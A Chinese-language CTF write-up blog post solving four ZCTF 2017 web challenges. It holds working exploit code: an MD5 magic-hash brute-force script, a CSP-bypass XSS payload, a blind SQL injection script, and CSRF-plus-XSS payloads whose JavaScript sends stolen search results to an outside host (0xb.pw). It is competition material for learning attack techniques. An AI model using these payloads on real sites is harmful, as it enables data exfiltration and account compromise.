---
title: zctf2017 writeup
date: 2017-02-27 21:31:55
tags:
- Blogs
- ctf
categories:
- Blogs
---


![image_1b9uuk1n36lm1gonn8bemmv99.png-454.2kB][1]

2月末打了个zctf，说实话题目出的不好，所有的web题目都是假题目，稍微记录下吧

<!--more-->

# web1 #

没什么意思

存在
```
.index.php.swp
<?php
$flag = $_GET['flag'];
if ($flag != '15562') {
	if (strstr($flag, 'zctf')) {
		if (substr(md5($flag),8,16) == substr(md5('15562'),8,16)) {
			die('ZCTF{#########}');
		}
	}##
}
die('ha?')
?>
```
直接写脚本
爆破一下
```
<?php       
for ($a = 1; $a <= 999999; $a++) {
    $flag = $a."zctf";
        if (substr(md5($flag),8,16) == substr(md5('15562'),8,16)){
            echo $flag.":";
            echo substr(md5($flag),8,16)."\n";
        }
}
echo $flag;
?> 
```

因为是 0e 开头的，爆破前两位就可以
```
for i in range(10000000):
	s = 'zctf' + str(i)
	md5 = hashlib.md5(s).hexdigest()
	h = md5[8:24]
	flag = 1
	if md5[8:10] == '0e':
		for j in md5[10:24]:
			if j.isalpha():
				flag = 0
				break
		if flag == 1:
			print s
			break
```

# web2 #

稍微翻翻站，其实没什么功能，只有contact.php这里是一个有返回的功能，其他的都是直接跳#的，那么问题就是这个了
```
http://58.213.63.30:10006/a0f1b29db350fdac2ad6dc4cb92dbd2b/message.php


Name=dsafim<link>gafsadsa&Email=123%40qq.com&Team=1321321&textarea=321421321
```

CSP
```
Content-Security-Policy	
default-src 'self'; script-src 'self' 'unsafe-inline';
```

这题其实最大的问题就是太过严格的过滤以及盲测，除了textarea有判断以外，其他的都没什么检测，事实是只记录了这个,script很随便，但过滤了：
```
eval
document
location
href
window
src
svg
img
open
callback
单双引号
括号
反斜杠
$\#
```

问题的核心其实是没有括号，没有任何办法绕过传入字符串，也没办法打cookie，后来没办法找到了长短短的bypass csp方式，获取请求的时候发现直接拿到了flag...

payload

```
</textarea><script>//@ sourceMappingURL=http://0xb.pw</script>


zctf%7Be042d9c03263521c86025a4b47b03055%7D
```

# web3 eazy apk #

分析apk，找到http://58.213.63.30:10005/

分析出加密的方式，写个脚本
```
key = "1470"*10
name = "' AND select 1#"

name =  ''.join(reversed(list(name)))
tmp=[]
for i in range(len(name)):
	tmp.append(hex(ord(name[i])^ord(key[i]))[2:].zfill(2))

enc = ''.join(tmp)
print enc

```

猜测是sql注入，但是有点儿麻烦的是union select和括号被过滤了，很难受。

后来查到可以用用union distinct select方式绕过union select ，然后使用order by盲注

`admin'union distinct select 1,’test’,'3' order by 3 desc# `
如果username返回的是admin，那么自己构造的password小于admin的密码
大于的话就会返回test

```
 import requests
#5AF1AB27B1BE8BB8E39BDF98CD2CFCE4
password = ""
for i in range(0,33):
	for j in range(33,127):
		key = "1470"*100
		name = "admin'union distinct select 1,'test','"+password+chr(j)+"' order by 3 desc #"
		print name
		name =  ''.join(reversed(list(name)))
		tmp=[]
		print len(name)
		for i in range(len(name)):
		    tmp.append(hex(ord(name[i])^ord(key[i]))[2:].zfill(2))	

		enc = ''.join(tmp)
		print enc	

		r = requests.post(url = "http://58.213.63.30:10005" , data = {'username':enc,'password':'123'})
		# print r. content
		if "test" in r.content:
			password = password+chr(j-1)
			break
print password 
```

密码5AF1AB27B1BE8BB8E39BDF98CD2CFCE4
拿cmd5查
密码明文:CleverBoy123
加密之后
```
username=”5f5d5a5450”
password=”020606495e76455547515b73”
```

手机apk登陆后发现是发送邮件的，抓包

```
http://58.213.63.30:10005/mail.php

body=45475244&password=020606495e76455547515b73&title=45475244&username=5f5d5a5450&mail=521a557050
```

理所当然认为是phpmailer的cve，只是想了很久怎么写个webshell进去，可惜没想到随便测试了一下能不能写入文件，结果就getflag了...

以前写过分析文章，随便一个payload都可以
[http://lorexxar.cn/2016/12/28/cve-2016-10030/](http://lorexxar.cn/2016/12/28/cve-2016-10030/)

# web4时间 #

功能稍微有点儿多的

分析下

1、profile.php可以设置头像，这里内容不受影响，可以放任何东西

```
http://58.213.63.30:10003/uploads/0df8ddb2fee38858a4ddb8307d77f95baf869147.png

HTTP/1.1 200 OK
Date: Sun, 26 Feb 2017 04:52:31 GMT
Server: Apache/2.4.7 (Ubuntu)
Last-Modified: Sun, 26 Feb 2017 04:50:09 GMT
ETag: "9-54967b28d17fd"
Accept-Ranges: bytes
Content-Length: 9
Content-Type: image/png
```

2、note.php地方可以添加什么东西，但是需要csrftoken，如果可以写js的话，可以绕

ps：只显示6条

3、http://58.213.63.30:10003/search.php?keywords=1可以查询，但是返回只有数目

ps：这里是like的语法，也就是说可以逐位的跑一些内容

4、bugsubmit猜测有几个利用点，一个是url，可能会点击，一个是图片，可以加外链的，但是好像什么都没发生（这里坑了超久，开始测试的时候，这里链接是没人点击的...很晚了测试的时候无意中发现有人点击...导致也就来不及写payload了）

5、cookie是httponly

nikename和address可以xss，复写绕过，这样尖括号就不会被转义了（不知道这里咋写的...单纯传入尖括号会被转义）

```
<scrsvgipt>alert(1)</scrsvgipt>

<scrsvgipt src=//119.29.192.14/1></scrsvgipt>
```

可以随意开火，但是不能让别人看到，所以需要一个csrf来让别人修改自己的个人信息

<del>bugsubmit的上传图片是假的，直接转成了img标签</del>

后来发现提交的链接是会被点击的，那么思路很简单了，就是构造一个自动提交来修改查看人的个人信息，然后执行js

payload
```
<html>
<head>
    <script src="jquery-3.1.0.min.js"></script>
</head>

<body>
<form action="http://58.213.63.30:10003/checkProfile.php" method="POST" id="profile" enctype="multipart/form-data">
        <input class="form-control" name="nick" id="nick" />
        <input class="form-control" name="age" id="age" />
        <input class="form-control" name="address" id="address" />
</form>
<script>
$("form input:eq(0)").val("\<scriscriptpt src=http:\/\/119.29.192.14\/2\>");
$("form input:eq(2)").val('\<\/scrscriptipt\>');
$("form").submit();
</script>
</body>
</html>
```

这payload是打到后台后随便找了个人扒的，这部分很简单就不赘述了

关键是要执行什么js呢，仔细看看上面的信息，cookie是httponly的，所以我们没办法获取cookie，那么flag只有可能是存在note中的了，而note中只显示6条（听蓝猫师傅说这里是极乐净土....），search处可以查询，但是需要逐位跑，这样就需要一个脚本了...(这里有个新的问题，也就是导致我没有获得flag的最大问题...脚本执行时间有限，我使用了跑完返回的方式...结果一次都没收到，我以为是别的问题，还跑了一下note的条数)

```
这个是返回数目的payload

$.get('http://58.213.63.30:10003/search.php?keywords=%', function(result){
  $.get('http://0xb.pw?a='+ escape(result.substr(2400,30)));
})
```

还有打flag的payload
```
tab="0123456789abcdefghijklmnopqrstuvwxyz}"                                    
str=''                                                                         
$.ajaxSettings.async=false                                                     
for(i=0;i<40;i++){                                                                   
  for(i=0;i<tab.length;i++){                                                   
    flag=false                                                                 
    x=$.get('http://58.213.63.30:10003/search.php?keywords='+str+tab[i]); 
    if(x.status==404) flag=true;                                               
    if(!flag) break;                                                           
  }                                                                            
  $.get("http://0xb.pw/?a="+escape(tab[i]))
  str+=tab[i];                                                                 
} 
```

还没测试就关题目了...就这样吧


  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/t2e9kvty7o8xv0kj5x7uh18d/image_1b9uuk1n36lm1gonn8bemmv99.png